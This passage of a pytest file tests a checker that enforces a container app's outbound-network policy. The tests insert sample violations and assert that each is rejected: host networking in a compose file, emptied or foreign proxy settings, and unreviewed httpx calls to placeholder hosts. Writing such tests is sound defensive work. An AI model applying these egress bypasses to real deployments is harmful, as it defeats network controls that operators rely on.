    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    path.write_text(baseline)
    spec = importlib.util.spec_from_file_location("network_contract", ROOT / "scripts/network-contract.py")
    checker = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(checker)
    policy = contract_tree / "config/egress-allowlist.toml"
    with policy.open("a") as stream:
        for relative, _, kind, digest, description in checker.source_inventory(contract_tree):
            if relative == "src/synthetic_probe.py":
                # fixture-write: Mutate the synthetic contract tree for boundary validation.
                stream.write('\n[[source]]\n' + '\n'.join(
                    f'{key} = {json.dumps(value)}' for key, value in
                    (("path", relative), ("kind", kind), ("digest", digest), ("detail", description))) + '\n')
    assert run_contract(contract_tree).returncode == 0
    line = baseline.splitlines().index("    # NEW") + 1
    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    path.write_text(baseline.replace("# NEW", addition))
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert result.stderr.strip() == f"src/synthetic_probe.py:{line}: unreviewed outbound client: {detail}"


def test_contract_rejects_new_compose_and_duplicate_keys(contract_tree):
    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    (contract_tree / "compose.escape.yaml").write_text("services: {app: {network_mode: host}}\n")
    assert run_contract(contract_tree).returncode == 1
    (contract_tree / "compose.escape.yaml").unlink()
    path = contract_tree / "compose.yaml"
    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    path.write_text(path.read_text() + "\nnetworks: {}\n")
    assert run_contract(contract_tree).returncode == 1


def test_proxy_configuration_and_internal_clients(monkeypatch):
    import httpx
    compose = yaml.safe_load((ROOT / "compose.yaml").read_text())
    env = compose["services"]["app"]["environment"]
    for key in ("HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy", "ALL_PROXY", "all_proxy", "NO_PROXY", "no_proxy"):
        monkeypatch.setenv(key, env[key])
    with httpx.Client() as client:
        issuer = client._transport_for_url(httpx.URL("https://issuer.example.test"))
        assert isinstance(issuer._pool, __import__('httpcore').HTTPProxy)
        assert isinstance(client._transport_for_url(httpx.URL("http://retrieval:8787"))._pool, __import__("httpcore").HTTPProxy)
        assert isinstance(client._transport_for_url(httpx.URL("https://generator:8000"))._pool, __import__("httpcore").HTTPProxy)
    proxy = compose["services"]["egress-proxy"]
    # Each relay destination is one exact authority plus its reviewed pins.
    destination_pairs = {
        ("OIDC_ISSUER", "OIDC_ISSUER_PINS"): ("OIDC_EGRESS_ISSUER", "OIDC_EGRESS_PINS"),
        ("GENERATOR_EGRESS_URL", "GENERATOR_EGRESS_PINS"): ("GENERATOR_EGRESS_URL", "GENERATOR_EGRESS_PINS"),
    }
    destination_pairs.update({(role + "_EGRESS_URL", role + "_EGRESS_PINS"):
                              (role + "_EGRESS_URL", role + "_EGRESS_PINS")
                              for role in ("EMBEDDING", "RERANK")})
    expected = {
        setting: "${" + source + ":-}"
        for settings, sources in destination_pairs.items()
        for setting, source in zip(settings, sources)
    }
    assert proxy["environment"] == expected
    assert not any(key in proxy for key in ("volumes", "secrets", "env_file", "ports"))
    assert compose["services"]["gateway"]["networks"] == ["front", "services"]
    overlay = yaml.safe_load((ROOT / "compose.kerberos.yaml").read_text())
    assert "services" in overlay["services"]["kerberos-proxy"]["networks"]


@pytest.mark.parametrize('key,value', [('HTTP_PROXY',''),('NO_PROXY','postgres'),('CASE_INTELLIGENCE_OIDC_PROXY','http://foreign.example.test:3128')])
def test_contract_rejects_proxy_routing_overrides(contract_tree, key, value):
    path = contract_tree / 'compose.local-accounts.yaml'
    data = yaml.safe_load(path.read_text())
    data['services']['app'].setdefault('environment', {})[key] = value
    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    path.write_text(yaml.safe_dump(data))
    result = run_contract(contract_tree)
    assert result.returncode == 1 and 'compose.local-accounts.yaml:' in result.stderr


@pytest.mark.parametrize("relative", ["scripts/synthetic_probe.py", "scripts/nested/synthetic_probe.py"])
def test_network_contract_reviews_operational_script_clients(contract_tree, relative):
    path = contract_tree / relative
    path.parent.mkdir(exist_ok=True)
    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    path.write_text('import httpx\nhttpx.get("https://new-script.example.invalid")\n')
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert relative + ":2:" in result.stderr and "outbound client" in result.stderr
    assert "new-script.example.invalid" in result.stderr
